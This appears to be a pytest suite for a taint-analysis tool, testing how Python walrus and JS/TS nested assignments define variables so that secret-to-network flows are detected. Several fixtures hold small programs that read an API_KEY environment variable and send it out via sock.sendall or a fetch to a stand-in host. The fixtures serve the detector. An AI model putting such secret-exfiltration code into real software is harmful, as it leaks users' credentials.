# SPDX-License-Identifier: AGPL-3.0-or-later
"""An assignment nested inside an expression DEFINES its target (WI-tozar).

Python's walrus (``named_expression``) and a JS/TS ``assignment_expression``
inside a condition, an argument or a right-hand side were recorded as a USE of
the name and never as a definition, so the reaching-def solver had no
definition to chain from: ``if (t := os.environ["K"]): sock.sendall(t)`` read
``ddg_mixed`` / ``not_attempted`` where the same flow written as two statements
read ``ddg`` / ``confirmed``. Java and C (one walker over every expression)
already defined such targets; these tests hold Python and JS/TS to the same
rule, plus the three refinements the rule needs in these languages:

* CONTAINED ONLY. The binding defines only when its value goes nowhere but a
  test or another binding on the same statement. Passed to a call, used as a
  receiver, returned or stored in a container, the value ALSO goes somewhere
  the walk does not follow (on a line that defines an heir it follows the
  heir, not the call), and a definition there turned a reported leak into a
  removal. Those stay uses, as they were. WI-jusoj closed the hole on the
  source's own line; it is still open on a later use line, which is why the
  rule stays (see the two escape tests below).
* A binding that may NOT execute (the right operand of ``and`` / ``&&`` /
  ``||`` / ``??``, a ternary branch, a comprehension, an optional call chain)
  is a WEAK update: the name is defined AND used, so a value assigned before
  it still reaches what follows. A strong kill there would let the walk
  refute a flow that runs whenever the branch is skipped.
* A binding inside a closure (``lambda``, an arrow, a nested function) is the
  closure's, not this statement's: it stays a use, as it was before.

Every case is built on the production path (``cfg.build_function_cfg`` +
``cfg.populate_def_use_for_cfg`` after the registry is filled), and each
asserts that its statement was reached before asserting what it holds.
"""
from __future__ import annotations

import contextlib
import io
import json
from pathlib import Path
from typing import Any

import pytest
import tree_sitter
from tree_sitter_language_pack import get_language

from hypergumbo_core import cfg, dataflow_scope
from hypergumbo_core.cli import main

_FUNCTION = {
    "python": "function_definition",
    "javascript": "function_declaration",
    "typescript": "function_declaration",
}


@pytest.fixture(autouse=True)
def _registered() -> None:
    # A registry filled by import side effect is empty until something imports it.
    assert dataflow_scope.ensure_def_use_extractors_registered()


def _statement(language: str, source: str, snippet: str) -> cfg.CfgStatement:
    """The CFG statement of the first function whose snippet starts with ``snippet``."""
    src = source.encode()
    tree = tree_sitter.Parser(get_language(language)).parse(src)
    fn = next(n for n in tree.root_node.children if n.type == _FUNCTION[language])
    body = fn.child_by_field_name("body")
    mapping = cfg.load_cfg_mapping(language)
    assert mapping is not None
    built = cfg.build_function_cfg(body, src, mapping, "f")
    cfg.populate_def_use_for_cfg(built, body, src, language)
    found = [
        s for b in built.blocks.values() for s in b.statements
        if s.code_snippet.startswith(snippet)
    ]
    assert found, f"no statement starts with {snippet!r}"  # reach first
    return found[0]


def _py(line: str) -> str:
    return "def f(n, flag, xs):\n    " + line + "\n        pass\n" if line.endswith(":") \
        else "def f(n, flag, xs):\n    " + line + "\n"


# --------------------------------------------------------------------------
# Python
# --------------------------------------------------------------------------

#: (statement, the snippet the CFG records it under, strong defines, weak defines)
_PY_CASES = [
    # The item's probe statements whose value is contained.
    ("if (m := g(n)) > 0:", "(m := g(n)) > 0", ["m"], []),
    ("while (k := g(n)):", "(k := g(n))", ["k"], []),
    ("y = (z := g(n)) + 1", "y = (z", ["z", "y"], []),
    # A bare walrus as the whole condition.
    ("if m := g(n):", "m := g(n)", ["m"], []),
    # A chained assignment's inner target is a right-hand-side binding too.
    ("x = y = g(n)", "x = y", ["y", "x"], []),
    # A test consumes its value even inside a call's argument.
    ("h(1 if (c := g(n)) else 2)", "h(1 if", ["c"], []),
    ("y = 1 if (c := g(n)) else 2", "y = 1", ["c", "y"], []),
    # May not execute: weak.
    ("if flag and (m := g(n)):", "flag and", [], ["m"]),
    ("y = (a := g(n)) if flag else (b := g(n))", "y = (a", ["y"], ["a", "b"]),
    # PEP 572: a comprehension filter's walrus binds in the ENCLOSING function,
    # and runs once per element -- possibly never.
    ("ys = [q for v in xs if (q := g(v))]", "ys = [q", ["ys"], ["q"]),
]


@pytest.mark.parametrize(("line", "snippet", "strong", "weak"), _PY_CASES)
def test_python_nested_binding_defines(
    line: str, snippet: str, strong: list[str], weak: list[str],
) -> None:
    stmt = _statement("python", _py(line), snippet)
    assert sorted(stmt.defines) == sorted(strong + weak), stmt
    for name in strong:
        # A definite binding kills: the statement does not also read the name
        # (none of these cases reads its target on the right).
        assert name not in stmt.uses, stmt
    for name in weak:
        # A binding that may not run keeps the previous value alive.
        assert name in stmt.uses, stmt


#: (statement, snippet, what IS defined) -- the walrus's value leaves the statement.
_PY_ESCAPING = [
    ("h(w := g(n))", "h(w", []),
    ("with open(c := g(n)) as fh:", "open(c", ["fh"]),
    ("return (r := g(n))", "return (r", []),
    ("(t := g(n)).encode()", "(t := g(n)).encode", []),
    ("ys = [(q := g(v)) for v in xs]", "ys = [(q", ["ys"]),
    ("d = {'k': (m := g(n))}", "d = {", ["d"]),
]


@pytest.mark.parametrize(("line", "snippet", "defined"), _PY_ESCAPING)
def test_python_escaping_binding_stays_a_use(line: str, snippet: str, defined: list[str]) -> None:
    stmt = _statement("python", _py(line), snippet)
    assert stmt.defines == defined, stmt
    walrus = line.split(":=")[0].rsplit("(", 1)[-1].strip()
    assert walrus in stmt.uses, stmt  # accounted for, exactly as before


@pytest.mark.parametrize(("line", "snippet", "defined", "read"), [
    # A nested write INTO an object mutates it: weak, the object stays read.
    ("x = self.a = g(n)", "x = self", ["self", "x"], ["self", "n"]),
    ("y = xs[n] = g(n)", "y = xs", ["xs", "y"], ["xs", "n"]),
    # The statement-level write keeps its older, strong reading.
    ("self.a = g(n)", "self.a", ["self"], ["n"]),
])
def test_python_nested_mutation_is_weak(
    line: str, snippet: str, defined: list[str], read: list[str],
) -> None:
    stmt = _statement("python", _py(line), snippet)
    assert sorted(stmt.defines) == sorted(defined), stmt
    assert set(read) <= set(stmt.uses), stmt


def test_python_condition_operands_are_still_read() -> None:
    stmt = _statement("python", _py("if flag and (m := g(n)):"), "flag and")
    assert {"flag", "n", "m"} <= set(stmt.uses)


def test_python_lambda_walrus_binds_the_lambda_not_the_function() -> None:
    stmt = _statement("python", _py("g2 = lambda: (t := h(n))"), "g2 = lambda")
    assert stmt.defines == ["g2"]
    assert "t" in stmt.uses  # still accounted for, as before


def test_python_top_level_assignment_is_unchanged() -> None:
    stmt = _statement("python", _py("m = g(n)"), "m = g")
    assert stmt.defines == ["m"]
    assert stmt.uses == ["n"]


# --------------------------------------------------------------------------
# JavaScript / TypeScript (one extractor, two registrations)
# --------------------------------------------------------------------------

_JS_CASES = [
    # The item's probe statements whose value is contained.
    ("if ((m = g(n)) > 0) { s(m); }", "((m = g(n)) > 0)", ["m"], []),
    ("y = (m = g(n)) + 1;", "y = (m", ["m", "y"], []),
    # The standard regex-iteration loop.
    ("while ((r = re.exec(n)) !== null) { s(r); }", "((r = re.exec", ["r"], []),
    ("const a = (b = g(n));", "const a", ["b", "a"], []),
    ("x = y = g(n);", "x = y", ["y", "x"], []),
    ("t += (u = g(n));", "t +=", ["u"], ["t"]),  # += reads t
    # A comma sequence evaluates every operand.
    ("y = (p = g(n), q = h(n));", "y = (p", ["p", "q", "y"], []),
    ("if (!(m = g(n))) { s(m); }", "(!(m", ["m"], []),
    # A test consumes its value even inside a call's argument...
    ("h((m = g(n)) ? 1 : 2);", "h((m", ["m"], []),
    # ...unless an optional chain may skip the arguments altogether.
    ("o?.f((m = g(n)) ? 1 : 2);", "o?.f", [], ["m"]),
    ("o?.p.f((m = g(n)) ? 1 : 2);", "o?.p.f", [], ["m"]),
    ("f?.((m = g(n)) ? 1 : 2);", "f?.(", [], ["m"]),
    ("(o?.p).f((m = g(n)) ? 1 : 2);", "(o?.p)", ["m"], []),
    # May not execute: weak.
    ("if (flag && (m = g(n))) { s(m); }", "(flag &&", [], ["m"]),
    ("y = flag || (m = g(n));", "y = flag ||", ["y"], ["m"]),
    ("y = flag ?? (m = g(n));", "y = flag ??", ["y"], ["m"]),
    ("y = flag ? (a = g(n)) : (b = g(n));", "y = flag ?", ["y"], ["a", "b"]),
]


@pytest.mark.parametrize("language", ["javascript", "typescript"])
@pytest.mark.parametrize(("line", "snippet", "strong", "weak"), _JS_CASES)
def test_jsts_nested_binding_defines(
    language: str, line: str, snippet: str, strong: list[str], weak: list[str],
) -> None:
    source = "function f(n, flag, o, re) {\n  " + line + "\n}\n"
    stmt = _statement(language, source, snippet)
    assert sorted(stmt.defines) == sorted(strong + weak), stmt
    for name in strong:
        assert name not in stmt.uses, stmt
    for name in weak:
        assert name in stmt.uses, stmt


@pytest.mark.parametrize(("line", "defined"), [
    ("i++;", ["i"]), ("--i;", ["i"]), ("x ??= i++;", ["i", "x"]),
    # An index escapes into the lookup: not contained, still read.
    ("h(a[i++]);", []),
])
def test_jsts_update_expression_defines_and_reads(line: str, defined: list[str]) -> None:
    """``i++`` writes ``i`` from its own value: a define that is also a use."""
    stmt = _statement("javascript", "function f(a, x) {\n  let i = 0;\n  " + line + "\n}\n",
                      line[:3])
    assert sorted(stmt.defines) == defined
    assert "i" in stmt.uses


@pytest.mark.parametrize(("line", "snippet", "defined", "read"), [
    # A nested write INTO an object mutates it: weak, the object stays read.
    ("x = this.b = g(n);", "x = this", ["this", "x"], ["this", "n"]),
    ("x = o.p = g(n);", "x = o", ["o", "x"], ["o", "n"]),
    ("h(o.p = g(n));", "h(o", [], ["o", "n"]),
    # The statement-level write keeps its older, strong reading.
    ("this.b = g(n);", "this.b", ["this"], ["n"]),
])
def test_jsts_nested_mutation_is_weak(
    line: str, snippet: str, defined: list[str], read: list[str],
) -> None:
    stmt = _statement("javascript", "function f(n, o) {\n  " + line + "\n}\n", snippet)
    assert sorted(stmt.defines) == sorted(defined), stmt
    assert set(read) <= set(stmt.uses), stmt


def test_jsts_statement_level_field_write_is_unchanged() -> None:
    stmt = _statement("javascript", "function f(n) {\n  this.b = g(n);\n}\n", "this.b")
    assert stmt.defines == ["this"]
    assert stmt.uses == ["n"]


def test_jsts_logical_assignment_right_side_may_not_run() -> None:
    stmt = _statement("javascript", "function f(n, x) {\n  x ??= (m = g(n));\n}\n", "x ??=")
    assert sorted(stmt.defines) == ["m", "x"]
    assert {"m", "x"} <= set(stmt.uses)


@pytest.mark.parametrize(("line", "snippet", "defined"), [
    ("h(m = g(n));", "h(m", []),
    ("acc.push(m = g(n));", "acc.push", []),
    ("h(flag || (m = g(n)));", "h(flag", []),
    ("o?.f(m = g(n));", "o?.f", []),
    ("(m = g(n)).trim();", "(m = g(n)).trim", []),
    ("return (m = g(n));", "return (m", []),
    ("const a = [m = g(n)];", "const a", ["a"]),
    ("const a = { k: (m = g(n)) };", "const a", ["a"]),
    ("data[m = g(n)] = 1;", "data[m", ["data"]),
])
def test_jsts_escaping_binding_stays_a_use(line: str, snippet: str, defined: list[str]) -> None:
    stmt = _statement("javascript", "function f(n, flag, o, acc, data) {\n  " + line + "\n}\n",
                      snippet)
    assert stmt.defines == defined, stmt
    assert "m" in stmt.uses, stmt  # accounted for, exactly as before


@pytest.mark.parametrize("line", [
    "const cb = () => { k = g(n); };",
    "const cb = function () { k = g(n); };",
    "h(() => (k = g(n)));",
    "const o = { m() { k = g(n); } };",
    "const C = class { m() { k = g(n); } };",
])
def test_jsts_closure_binding_is_not_this_statements(line: str) -> None:
    stmt = _statement("javascript", "function f(n) {\n  let k;\n  " + line + "\n}\n",
                      line[:6])
    assert "k" not in stmt.defines
    assert "k" in stmt.uses  # still accounted for, as before


def test_jsts_top_level_assignment_is_unchanged() -> None:
    stmt = _statement("javascript", "function f(n) {\n  m = g(n);\n}\n", "m = g")
    assert stmt.defines == ["m"]
    assert stmt.uses == ["n"]


# --------------------------------------------------------------------------
# Production path: verify-claims
# --------------------------------------------------------------------------

_CLAIMS = (
    "claims:\n  - id: C\n    text: t\n    constraint:\n      taint_flow:\n"
    "        source_taint: host_secret\n        prohibited_sink_zone: network\n"
)
_PY_HEAD = "import os\nimport socket\n\n\ndef f(flag):\n    sock = socket.socket()\n"
_JS_HEAD = "function handler(url, flag) {\n"
_JS_TAIL = "}\nmodule.exports = { handler };\n"

#: name -> (file, nested form, plain two-statement form of the same program)
_PAIRS = {
    "python": (
        "app.py",
        _PY_HEAD + '    if (t := os.environ["API_KEY"]):\n        sock.sendall(t.encode())\n',
        _PY_HEAD + '    t = os.environ["API_KEY"]\n    if t:\n        sock.sendall(t.encode())\n',
    ),
    "javascript": (
        "app.js",
        _JS_HEAD + '  let k;\n  if ((k = process.env.API_KEY)) {\n'
        '    return fetch("https://x.example/?k=" + k);\n  }\n' + _JS_TAIL,
        _JS_HEAD + '  let k;\n  k = process.env.API_KEY;\n  if (k) {\n'
        '    return fetch("https://x.example/?k=" + k);\n  }\n' + _JS_TAIL,
    ),
    # The same shape in a class method, which the DDG names through js_ts.py.
    "javascript-method": (
        "app.js",
        "class Client {\n  send(url) {\n    let k;\n    while ((k = process.env.API_KEY)) {\n"
        '      return fetch("https://x.example/?k=" + k);\n    }\n  }\n}\n'
        "module.exports = { Client };\n",
        "class Client {\n  send(url) {\n    let k;\n    k = process.env.API_KEY;\n"
        '    while (k) {\n      return fetch("https://x.example/?k=" + k);\n    }\n  }\n}\n'
        "module.exports = { Client };\n",
    ),
}


def _verdict(tmp_path: Path, monkeypatch: pytest.MonkeyPatch, name: str, text: str) -> dict:
    repo = tmp_path / "repo"
    repo.mkdir(parents=True)
    (repo / name).write_text(text)
    claims = tmp_path / "claims.yaml"
    claims.write_text(_CLAIMS)
    monkeypatch.setenv("XDG_CACHE_HOME", str(tmp_path / "cache"))
    buf = io.StringIO()
    with contextlib.redirect_stdout(buf), contextlib.redirect_stderr(io.StringIO()):
        main(["verify-claims", str(repo), "--claims", str(claims), "--format", "json"])
    (verdict,) = json.loads(buf.getvalue())["verdicts"]
    return verdict


def _walks(verdict: dict) -> list[tuple[Any, Any]]:
    return [(e["analysis_method"], e["walk_verdict"]) for e in verdict["evidence"]]


@pytest.mark.parametrize("language", sorted(_PAIRS))
def test_a_nested_binding_is_walked_like_the_plain_assignment(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, language: str,
) -> None:
    """THE ITEM'S ACCEPTANCE: the nested form reads ``ddg`` / ``confirmed``,
    exactly like the control written as two statements."""
    name, nested, plain = _PAIRS[language]
    control = _verdict(tmp_path / "plain", monkeypatch, name, plain)
    assert control["verdict"] == "violated"
    assert _walks(control) == [("ddg", "confirmed")]  # the control's own reach
    got = _verdict(tmp_path / "nested", monkeypatch, name, nested)
    assert got["verdict"] == "violated"
    assert _walks(got) == [("ddg", "confirmed")]


_REASSIGNED_ON_ONE_BRANCH = {
    "python": (
        "app.py",
        _PY_HEAD + '    t = os.environ["API_KEY"]\n'
        '    if flag and (t := "redacted"):\n        pass\n'
        "    sock.sendall(t.encode())\n",
    ),
    "javascript": (
        "app.js",
        _JS_HEAD + "  let k = process.env.API_KEY;\n"
        '  if (flag && (k = "x")) {\n    console.log(1);\n  }\n'
        '  return fetch("https://x.example/?k=" + k);\n' + _JS_TAIL,
    ),
}


_ESCAPES_AT_ITS_OWN_LINE = {
    "python": (
        "app.py",
        _PY_HEAD + "    acc = []\n"
        '    acc.append(t := os.environ["API_KEY"])\n    print(len(t))\n'
        "    sock.sendall(acc[0].encode())\n",
    ),
    "javascript": (
        "app.js",
        _JS_HEAD + "  const acc = [];\n  let k;\n  acc.push(k = process.env.API_KEY);\n"
        "  console.log(k.length);\n  return fetch(url + acc[0]);\n" + _JS_TAIL,
    ),
}


#: The same escape on a USE line rather than the source's line. WI-jusoj's
#: source-line escape check does not reach it: with escaping bindings
#: defined, the JavaScript case read ``confirmed_with_caveats`` (2026-10-20).
_ESCAPES_ON_A_USE_LINE = {
    "python": (
        "app.py",
        _PY_HEAD + '    acc = []\n    t = os.environ["API_KEY"]\n'
        "    acc.append(k := t)\n    print(len(k))\n"
        "    sock.sendall(acc[0].encode())\n",
    ),
    "javascript": (
        "app.js",
        _JS_HEAD + "  const acc = [];\n  const t = process.env.API_KEY;\n  let k;\n"
        "  acc.push(k = t);\n  console.log(k.length);\n"
        "  return fetch(url + acc[0]);\n" + _JS_TAIL,
    ),
}


@pytest.mark.parametrize("language", sorted(_ESCAPES_AT_ITS_OWN_LINE))
def test_a_binding_whose_value_also_escapes_does_not_seed_a_removal(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, language: str,
) -> None:
    """The secret goes into ``acc`` AND ``k`` on one line; ``acc`` is sent. The
    walk follows only the line's definitions, so a definition of ``k`` here
    let it exhaust on ``console.log`` and REMOVE the leak (JavaScript went
    ``violated`` -> ``confirmed_with_caveats`` with that definition)."""
    name, text = _ESCAPES_AT_ITS_OWN_LINE[language]
    got = _verdict(tmp_path, monkeypatch, name, text)
    assert got["verdict"] == "violated", got
    assert got["evidence"], got


@pytest.mark.parametrize("language", sorted(_ESCAPES_ON_A_USE_LINE))
def test_a_binding_whose_value_escapes_on_a_use_line_does_not_seed_a_removal(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, language: str,
) -> None:
    """``acc.push(k = t)``: the secret goes into ``acc`` and ``k`` on a line
    after the source, and ``acc`` is sent. This is the case that keeps the
    CONTAINED ONLY rule: a definition of ``k`` here lets the walk follow ``k``,
    exhaust on ``console.log`` and remove the leak."""
    name, text = _ESCAPES_ON_A_USE_LINE[language]
    got = _verdict(tmp_path, monkeypatch, name, text)
    assert got["verdict"] == "violated", got
    assert got["evidence"], got


@pytest.mark.parametrize("language", sorted(_REASSIGNED_ON_ONE_BRANCH))
def test_a_short_circuited_rebinding_does_not_kill_the_secret(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, language: str,
) -> None:
    """When ``flag`` is false the secret reaches the sink unchanged. A strong
    kill at the short-circuited binding would let the walk say otherwise."""
    name, text = _REASSIGNED_ON_ONE_BRANCH[language]
    got = _verdict(tmp_path, monkeypatch, name, text)
    assert got["verdict"] == "violated"
    assert _walks(got) == [("ddg", "confirmed")]
